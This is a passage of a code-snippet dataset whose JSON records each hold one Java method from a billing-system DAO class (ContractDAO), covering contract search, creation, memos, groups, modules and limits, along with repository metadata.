req.setAttribute(\"type\", \"c1\");\n        else\n            req.setAttribute(\"type\", 1);\n        req.setAttribute(\"parameters\", Utils.toString(paramIds));\n        req.setAttribute(\"parameter\", value);\n\n        addSearchResult(result, page, req);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57357, "method_name": "searchContractByPhoneParam", "class_name": "ContractDAO", "params": ["SearchResult<Contract>", "SearchOptions", "Set<Integer>", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByPhoneParam(SearchResult<Contract> result, SearchOptions options, Set<Integer> paramIds, String phone)\n            throws BGException {\n        final Page page = result.getPage();\n\n        Request req = new Request();\n        req.setPage(page);\n        req.setModule(CONTRACT_MODULE_ID);\n\n        applySearchOptions(options, req);\n\n        req.setAction(\"FindContract\");\n        if (dbInfo.getVersion().compareTo(\"7.0\") >= 0)\n            req.setAttribute(\"type\", \"c9\");\n        else\n            req.setAttribute(\"type\", 9);\n        req.setAttribute(\"parameters\", Utils.toString(paramIds));\n        req.setAttribute(\"phone\", phone);\n\n        addSearchResult(result, page, req);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57358, "method_name": "searchContractByDateParam", "class_name": "ContractDAO", "params": ["SearchResult<Contract>", "SearchOptions", "Set<Integer>", "Date", "Date"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByDateParam(SearchResult<Contract> result, SearchOptions options, Set<Integer> paramIds, Date dateFrom, Date dateTo)\n            throws BGException {\n        final Page page = result.getPage();\n\n        Request req = new Request();\n        req.setPage(page);\n        req.setModule(CONTRACT_MODULE_ID);\n\n        applySearchOptions(options, req);\n\n        req.setAction(\"FindContract\");\n        if (dbInfo.getVersion().compareTo(\"7.0\") >= 0)\n            req.setAttribute(\"type\", \"c6\");\n        else\n            req.setAttribute(\"type\", 6);\n        req.setAttribute(\"parameters\", Utils.toString(paramIds));\n        req.setAttribute(\"date1\", TimeUtils.format(dateFrom, TimeUtils.PATTERN_DDMMYYYY));\n        req.setAttribute(\"date2\", TimeUtils.format(dateTo, TimeUtils.PATTERN_DDMMYYYY));\n\n        addSearchResult(result, page, req);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57359, "method_name": "searchContractByEmailParam", "class_name": "ContractDAO", "params": ["SearchResult<Contract>", "SearchOptions", "Set<Integer>", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByEmailParam(SearchResult<Contract> result, SearchOptions options, Set<Integer> paramIds, String email)\n            throws BGException {\n        final Page page = result.getPage();\n\n        Request req = new Request();\n        req.setPage(page);\n        req.setModule(CONTRACT_MODULE_ID);\n\n        applySearchOptions(options, req);\n\n        req.setAction(\"FindContract\");\n        req.setAttribute(\"type\", 3);\n        req.setAttribute(\"parameters\", Utils.toString(paramIds));\n        req.setAttribute(\"mail\", email);\n\n        addSearchResult(result, page, req);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57360, "method_name": "addSearchResult", "class_name": "ContractDAO", "params": ["SearchResult<Contract>", "Page", "Request"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void addSearchResult(SearchResult<Contract> result, final Page page, Request req) throws BGException {\n        setPage(req, page);\n\n        Document doc = transferData.postData(req, user);\n        //XMLUtils.serialize(doc, System.out, \"utf-8\");\n        Element contracts = XMLUtils.selectElement(doc, \"/data/contracts\");\n        if (contracts != null) {\n            getPage(page, contracts);\n\n            List<Contract> list = result.getList();\n            for (Element item : XMLUtils.selectElements(contracts, \"item\")) {\n                final String fullTitle = item.getAttribute(\"title\");\n\n                Contract contract = new Contract(dbInfo.getId(), Utils.parseInt(item.getAttribute(\"id\")),\n                        StringUtils.substringBefore(fullTitle, \"[\").trim(), StringUtils.substringBetween(fullTitle, \"[\", \"]\").trim());\n                list.add(contract);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57361, "method_name": "applySearchOptions", "class_name": "ContractDAO", "params": ["SearchOptions", "Request"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void applySearchOptions(SearchOptions options, Request req) {\n        if (options == null) {\n            req.setAttribute(\"del\", 0);\n            req.setAttribute(\"show_sub\", 0);\n            req.setAttribute(\"show_closed\", 0);\n        } else {\n            req.setAttribute(\"del\", Utils.booleanToStringInt(options.showDel));\n            req.setAttribute(\"show_sub\", Utils.booleanToStringInt(options.showSub));\n            req.setAttribute(\"show_closed\", Utils.booleanToStringInt(options.showClosed));\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57362, "method_name": "createContract", "class_name": "ContractDAO", "params": ["int", "String", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Contract", "snippet": "    public Contract createContract(int patternId, String date, String title, String titlePattern) throws BGException {\n        return createContract(patternId, date, title, titlePattern, 0);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57363, "method_name": "createContract", "class_name": "ContractDAO", "params": ["int", "String", "String", "String", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Contract", "snippet": "    public Contract createContract(int patternId, String date, String title, String titlePattern, int superId) throws BGException {\n        if (dbInfo.getCustomerIdParam() <= 0) {\n            throw new BGMessageException(\"\u041d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 customerIdParam \u0434\u043b\u044f \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \u0431\u0438\u043b\u043b\u0438\u043d\u0433\u0430.\");\n        }\n\n        Request req = new Request();\n        req.setModule(\"contract\");\n        req.setAction(\"NewContract\");\n        req.setAttribute(\"pattern_id\", patternId);\n        req.setAttribute(\"date\", date);\n        if (Utils.notBlankString(titlePattern)) {\n            req.setAttribute(\"custom_title\", titlePattern);\n        }\n        if (Utils.notBlankString(title)) {\n            req.setAttribute(\"title\", title);\n        }\n\n        if (superId > 0) {\n            req.setAttribute(\"super_id\", superId);\n        }\n\n        Document result = transferData.postData(req, user);\n\n        int contractId = Utils.parseInt(XMLUtils.selectText(result, \"/data/contract/@id\"));\n        String contractTitle = Utils.maskNull(XMLUtils.selectText(result, \"/data/contract/@title\"));\n\n        Contract contract = new Contract();\n        contract.setId(contractId);\n        contract.setTitle(contractTitle);\n        contract.setBillingId(this.dbInfo.getId());\n\n        return contract;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57364, "method_name": "getContractInfo", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ContractInfo", "snippet": "    public ContractInfo getContractInfo(int contractId) throws BGException {\n        ContractInfo result = null;\n\n        Request req = new Request();\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"ContractInfo\");\n        req.setAttribute(\"cid\", contractId);\n\n        Document doc = transferData.postData(req, user);\n\n        Element contract = XMLUtils.selectElement(doc, \"/data/contract\");\n        if (contract != null) {\n            result = new ContractInfo();\n\n            result.setBillingId(dbInfo.getId());\n            result.setId(contractId);\n            result.setComment(contract.getAttribute(\"comment\"));\n            result.setObjects(Utils.parseInt(contract.getAttribute(\"objects\").split(\"/\")[0]),\n                    Utils.parseInt(contract.getAttribute(\"objects\").split(\"/\")[1]));\n            result.setHierarchy(contract.getAttribute(\"hierarchy\"));\n            result.setHierarchyDep(Utils.parseInt(contract.getAttribute(\"hierarchyDep\")));\n            result.setHierarchyIndep(Utils.parseInt(contract.getAttribute(\"hierarchyIndep\")));\n            result.setDeleted(Utils.parseBoolean(contract.getAttribute(\"del\")));\n            result.setFace(Utils.parseInt(contract.getAttribute(\"fc\")));\n            result.setDateFrom(TimeUtils.parse(contract.getAttribute(\"date1\"), TimeUtils.PATTERN_DDMMYYYY));\n            result.setDateTo(TimeUtils.parse(contract.getAttribute(\"date2\"), TimeUtils.PATTERN_DDMMYYYY));\n            result.setMode(Utils.parseInt(contract.getAttribute(\"mode\")));\n            result.setBalanceLimit(Utils.parseBigDecimal(contract.getAttribute(\"limit\"), BigDecimal.ZERO));\n            result.setStatus(contract.getAttribute(\"status\"));\n            result.setTitle(contract.getAttribute(\"title\"));\n            result.setComments(Utils.parseInt(contract.getAttribute(\"comments\")));\n\n            if (\"super\".equals(contract.getAttribute(\"hierarchy\"))) {\n                result.setSubContractIds(new ContractHierarchyDAO(user, dbInfo).getSubContracts(contractId));\n            }\n\n            result.setGroupList(getList(XMLUtils.selectElement(doc, \"/data/info/groups\")));\n            result.setTariffList(getList(XMLUtils.selectElement(doc, \"/data/info/tariff\")));\n            result.setScriptList(getList(XMLUtils.selectElement(doc, \"/data/info/script\")));\n\n            Element modules = XMLUtils.selectElement(doc, \"/data/info/modules\");\n            if (modules != null) {\n                List<ModuleInfo> moduleList = new ArrayList<ModuleInfo>();\n                for (Element item : XMLUtils.selectElements(modules, \"item\")) {\n                    moduleList.add(new ModuleInfo(Utils.parseInt(item.getAttribute(\"id\")), item.getAttribute(\"title\"), item.getAttribute(\"package\"),\n                            item.getAttribute(\"status\")));\n                }\n                result.setModuleList(moduleList);\n            }\n\n            Element balance = XMLUtils.selectElement(doc, \"/data/info/balance\");\n            if (balance != null) {\n                result.setBalanceDate(\n                        new GregorianCalendar(Utils.parseInt(balance.getAttribute(\"yy\")), Utils.parseInt(balance.getAttribute(\"mm\")) - 1, 1)\n                                .getTime());\n                result.setBalanceIn(Utils.parseBigDecimal(balance.getAttribute(\"summa1\"), BigDecimal.ZERO));\n                result.setBalancePayment(Utils.parseBigDecimal(balance.getAttribute(\"summa2\"), BigDecimal.ZERO));\n                result.setBalanceAccount(Utils.parseBigDecimal(balance.getAttribute(\"summa3\"), BigDecimal.ZERO));\n                result.setBalanceCharge(Utils.parseBigDecimal(balance.getAttribute(\"summa4\"), BigDecimal.ZERO));\n                result.setBalanceOut(Utils.parseBigDecimal(balance.getAttribute(\"summa5\"), BigDecimal.ZERO));\n            }\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57365, "method_name": "getMemoList", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<ContractMemo>", "snippet": "    public List<ContractMemo> getMemoList(int contractId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"ContractMemo\");\n        request.setContractId(contractId);\n\n        Document document = transferData.postData(request, user);\n\n        List<ContractMemo> contractMemos = new ArrayList<ContractMemo>();\n        Element dataElement = document.getDocumentElement();\n        NodeList nodeList = dataElement.getElementsByTagName(\"row\");\n\n        for (int index = 0; index < nodeList.getLength(); index++) {\n            Element rowElement = (Element) nodeList.item(index);\n            ContractMemo memo = new ContractMemo();\n            memo.setId(Utils.parseInt(rowElement.getAttribute(\"f0\")));\n            memo.setTitle(rowElement.getAttribute(\"f1\"));\n            memo.setTime(TimeUtils.parse(rowElement.getAttribute(\"f3\"), TimeUtils.PATTERN_DDMMYYYYHHMMSS));\n            memo.setUser(rowElement.getAttribute(\"f4\"));\n            memo.setText(getMemo(contractId, memo.getId()).getText());\n\n            contractMemos.add(memo);\n        }\n\n        return contractMemos;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57366, "method_name": "getMemo", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "ContractMemo", "snippet": "    public ContractMemo getMemo(int contractId, int memoId) throws BGException {\n        ContractMemo memo = null;\n\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"GetContractMemo\");\n        request.setContractId(contractId);\n        request.setAttribute(\"id\", memoId);\n\n        Document doc = transferData.postData(request, user);\n\n        Element commentEl = XMLUtils.selectElement(doc, \"/data/comment\");\n        if (commentEl != null) {\n            memo = new ContractMemo();\n\n            memo.setTitle(commentEl.getAttribute(\"subject\"));\n            memo.setText(linesToString(commentEl));\n            memo.setVisibleForUser(Utils.parseBoolean(commentEl.getAttribute(\"visibled\")));\n        }\n\n        return memo;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57367, "method_name": "updateMemo", "class_name": "ContractDAO", "params": ["int", "int", "String", "String", "boolean"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateMemo(int contractId, int memoId, String memoTitle, String memoText, boolean visible) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"UpdateContractMemo\");\n        request.setContractId(contractId);\n        request.setAttribute(\"subject\", memoTitle);\n        request.setAttribute(\"comment\", memoText);\n        request.setAttribute(\"visibled\", visible);\n        if (memoId == 0) {\n            request.setAttribute(\"id\", \"new\");\n        } else {\n            request.setAttribute(\"id\", memoId);\n        }\n\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57368, "method_name": "updateMemo", "class_name": "ContractDAO", "params": ["int", "int", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateMemo(int contractId, int memoId, String memoTitle, String memoText) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"UpdateContractMemo\");\n        request.setContractId(contractId);\n        request.setAttribute(\"subject\", memoTitle);\n        request.setAttribute(\"comment\", memoText);\n        request.setAttribute(\"visibled\", false);\n        if (memoId == 0) {\n            request.setAttribute(\"id\", \"new\");\n        } else {\n            request.setAttribute(\"id\", memoId);\n        }\n\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57369, "method_name": "deleteMemo", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteMemo(int contractId, int memoId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"DeleteContractMemo\");\n        request.setContractId(contractId);\n        request.setAttribute(\"id\", memoId);\n\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57370, "method_name": "faceLog", "class_name": "ContractDAO", "params": ["SearchResult<ContractFace>", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void faceLog(SearchResult<ContractFace> result, int contractId) throws BGException {\n        List<ContractFace> list = result.getList();\n\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"ContractFace\");\n        request.setContractId(contractId);\n        request.setAttribute(\"type\", \"face\");\n        // 1 - \u043f\u0440\u044f\u043c\u0430\u044f \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430\n        request.setAttribute(\"view\", 0);\n        setPage(request, result.getPage());\n\n        Document document = transferData.postData(request, user);\n        for (Element el : XMLUtils.selectElements(document, \"/data/table/data/row\")) {\n            ContractFace face = new ContractFace();\n            face.setTime(TimeUtils.parse(el.getAttribute(\"date\"), TimeUtils.PATTERN_DDMMYYYYHHMMSS));\n            face.setUser(el.getAttribute(\"user\"));\n            face.setFace(el.getAttribute(\"value\"));\n\n            list.add(face);\n        }\n\n        getPage(result.getPage(), XMLUtils.selectElement(document, \"/data/table\"));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57371, "method_name": "updateFace", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateFace(int contractId, int face) throws BGException {\n        Request req = new Request();\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"SetFcContract\");\n        req.setContractId(contractId);\n        req.setAttribute(\"value\", face);\n\n        transferData.postData(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57372, "method_name": "modeLog", "class_name": "ContractDAO", "params": ["SearchResult<ContractMode>", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void modeLog(SearchResult<ContractMode> result, int contractId) throws BGException {\n        List<ContractMode> list = result.getList();\n\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"ContractMode\");\n        request.setContractId(contractId);\n        request.setAttribute(\"type\", \"mode\");\n        // 1 - \u043f\u0440\u044f\u043c\u0430\u044f \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430\n        request.setAttribute(\"view\", 0);\n        setPage(request, result.getPage());\n\n        Document document = transferData.postData(request, user);\n        for (Element el : XMLUtils.selectElements(document, \"/data/table/data/row\")) {\n            ContractMode face = new ContractMode();\n            face.setTime(TimeUtils.parse(el.getAttribute(\"date\"), TimeUtils.PATTERN_DDMMYYYYHHMMSS));\n            face.setUser(el.getAttribute(\"user\"));\n            face.setMode(el.getAttribute(\"value\"));\n\n            list.add(face);\n        }\n\n        getPage(result.getPage(), XMLUtils.selectElement(document, \"/data/table\"));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57373, "method_name": "updateMode", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateMode(int contractId, int mode) throws BGException {\n        Request req = new Request();\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"UpdateContractMode\");\n        req.setContractId(contractId);\n        req.setAttribute(\"value\", mode == ContractMode.MODE_CREDIT ? \"credit\" : \"debet\");\n        ;\n\n        transferData.postData(req, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57374, "method_name": "groupsGet", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Pair<List,Set>", "snippet": "    public Pair<List<IdTitle>, Set<Integer>> groupsGet(int contractId) throws BGException {\n        List<IdTitle> groupList = new ArrayList<IdTitle>();\n        Set<Integer> selectedIds = new HashSet<Integer>();\n\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"ContractGroup\");\n        request.setContractId(contractId);\n\n        Document document = transferData.postData(request, user);\n\n        long selected = 0L;\n        Element groups = XMLUtils.selectElement(document, \"/data/groups\");\n        if (groups != null) {\n            selected = Utils.parseLong(groups.getAttribute(\"selected\"));\n        }\n\n        for (Element rowElement : XMLUtils.selectElements(document, \"/data/groups/group\")) {\n            IdTitle group = new IdTitle();\n            group.setId(Utils.parseInt(rowElement.getAttribute(\"id\")));\n            group.setTitle(rowElement.getAttribute(\"title\"));\n\n            groupList.add(group);\n\n            if ((selected & (1L << group.getId())) > 0) {\n                selectedIds.add(group.getId());\n            }\n        }\n\n        return new Pair<List<IdTitle>, Set<Integer>>(groupList, selectedIds);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57375, "method_name": "updateGroup", "class_name": "ContractDAO", "params": ["String", "int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateGroup(String command, int contractId, int groupId) throws BGException {\n        if (dbInfo.getVersion().compareTo(\"5.2\") < 0) {\n            Request request = new Request();\n            request.setModule(CONTRACT_MODULE_ID);\n            request.setContractId(contractId);\n            request.setAttribute(\"value\", groupId);\n            request.setAttribute(\"id\", contractId);\n\n            if (\"add\".equals(command)) {\n                request.setAction(\"UpdateContractGroup\");\n            } else if (\"del\".equals(command)) {\n                request.setAction(\"ClearContractGroup\");\n            }\n\n            transferData.postData(request, user);\n        } else {\n            try {\n                ru.bgcrm.plugin.bgbilling.ws.contract.ContractService service = getWebService(ContractService_Service.class,\n                        ru.bgcrm.plugin.bgbilling.ws.contract.ContractService.class);\n                if (\"add\".equals(command)) {\n                    service.contractGroupAdd(contractId, groupId);\n                } else if (\"del\".equals(command)) {\n                    service.contractGroupRemove(contractId, groupId);\n                }\n            } catch (Exception e) {\n                processWebServiceException(e);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57376, "method_name": "additionalActionList", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> additionalActionList(int contractId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"AdditionalActionList\");\n        request.setContractId(contractId);\n\n        Document document = transferData.postData(request, user);\n\n        Element dataElement = document.getDocumentElement();\n        NodeList nodeList = dataElement.getElementsByTagName(\"item\");\n\n        List<IdTitle> additionalActionList = new ArrayList<IdTitle>();\n        for (int index = 0; index < nodeList.getLength(); index++) {\n            Element rowElement = (Element) nodeList.item(index);\n            IdTitle additionalAction = new IdTitle();\n            additionalAction.setId(Utils.parseInt(rowElement.getAttribute(\"id\")));\n            additionalAction.setTitle(rowElement.getAttribute(\"title\"));\n\n            additionalActionList.add(additionalAction);\n        }\n\n        return additionalActionList;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57377, "method_name": "executeAdditionalAction", "class_name": "ContractDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String executeAdditionalAction(int contractId, int actionId) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"AdditionalAction\");\n        request.setContractId(contractId);\n        request.setAttribute(\"action_id\", actionId);\n\n        Document document = transferData.postData(request, user);\n\n        Element dataElement = document.getDocumentElement();\n        NodeList nodeList = dataElement.getElementsByTagName(\"row\");\n\n        StringBuilder result = new StringBuilder();\n        for (int index = 0; index < nodeList.getLength(); index++) {\n            Element rowElement = (Element) nodeList.item(index);\n            result.append(rowElement.getAttribute(\"text\") + \"&#13;&#10;\");\n        }\n\n        return result.toString();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57378, "method_name": "moduleList", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Pair<List,List>", "snippet": "    public Pair<List<IdTitle>, List<IdTitle>> moduleList(int contractId) throws BGException {\n        List<IdTitle> selectedList = new ArrayList<IdTitle>();\n        List<IdTitle> availableList = new ArrayList<IdTitle>();\n\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setAction(\"ContractModuleList\");\n        request.setContractId(contractId);\n\n        Document document = transferData.postData(request, user);\n        for (Element item : XMLUtils.selectElements(document, \"/data/list_select/item\")) {\n            selectedList.add(new IdTitle(Utils.parseInt(item.getAttribute(\"id\")), item.getAttribute(\"title\")));\n        }\n        for (Element item : XMLUtils.selectElements(document, \"/data/list_avaliable/item\")) {\n            availableList.add(new IdTitle(Utils.parseInt(item.getAttribute(\"id\")), item.getAttribute(\"title\")));\n        }\n\n        return new Pair<List<IdTitle>, List<IdTitle>>(selectedList, availableList);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57379, "method_name": "updateModule", "class_name": "ContractDAO", "params": ["int", "int", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateModule(int contractId, int moduleId, String command) throws BGException {\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setContractId(contractId);\n        request.setAttribute(\"module_id\", moduleId);\n\n        if (\"add\".equals(command)) {\n            request.setAction(\"ContractModuleAdd\");\n        } else if (\"del\".equals(command)) {\n            request.setAction(\"ContractModuleDelete\");\n        } else {\n            throw new BGMessageException(\"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 command\");\n        }\n\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57380, "method_name": "limit", "class_name": "ContractDAO", "params": ["int", "SearchResult<LimitLogItem>", "List<LimitChangeTask>"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal limit(int contractId, SearchResult<LimitLogItem> log, List<LimitChangeTask> taskList) throws BGException {\n        BigDecimal result = BigDecimal.ZERO;\n\n        Request request = new Request();\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setContractId(contractId);\n        request.setAction(\"ContractLimit\");\n        if (log != null) {\n            setPage(request, log.getPage());\n        }\n\n        Document doc = transferData.postData(request, user);\n        result = Utils.parseBigDecimal(XMLUtils.selectText(doc, \"/data/table/@limitValue\"));\n\n        if (dbInfo.getVersion().compareTo(\"6.2\") >= 0) {\n            RequestJsonRpc req = new RequestJsonRpc(\n                    dbInfo.getVersion().compareTo(\"7.0\") >= 0 ? \"ru.bitel.bgbilling.kernel.contract.limit\" : \"ru.bitel.bgbilling.kernel.contract.api\",\n                    \"ContractLimitService\", \"contractLimitGet\");\n            req.setParamContractId(contractId);\n\n            result = jsonMapper.convertValue(transferData.postDataReturn(req, user), BigDecimal.class);\n        }\n\n        if (log != null) {\n            if (dbInfo.getVersion().compareTo(\"6.2\") >= 0) {\n                RequestJsonRpc req = new RequestJsonRpc(\"ru.bitel.bgbilling.kernel.contract.limit\", \"ContractLimitService\",\n                        \"searchContractLimitLogList\");\n                req.setParamContractId(contractId);\n                req.setParam(\"page\", log.getPage());\n\n                JsonNode ret = transferData.postDataReturn(req, user);\n                List<LimitLogItem> sessionList = readJsonValue(ret.findValue(\"list\").traverse(),\n                        jsonTypeFactory.constructCollectionType(List.class, LimitLogItem.class));\n                log.getList().addAll(sessionList);\n                log.getPage().setData(jsonMapper.convertValue(ret.findValue(\"page\"), Page.class));\n            } else {\n                getPage(log.getPage(), XMLUtils.selectElement(doc, \"/data/table\"));\n\n                for (Element item : XMLUtils.selectElements(doc, \"/data/table/data/row\")) {\n                    LimitLogItem logItem = new 